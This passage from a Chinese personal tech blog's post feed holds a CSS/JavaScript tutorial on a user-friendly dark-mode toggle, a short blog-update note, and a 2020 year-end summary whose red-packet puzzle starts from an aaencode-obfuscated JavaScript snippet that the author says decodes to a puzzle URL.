class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 18:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" 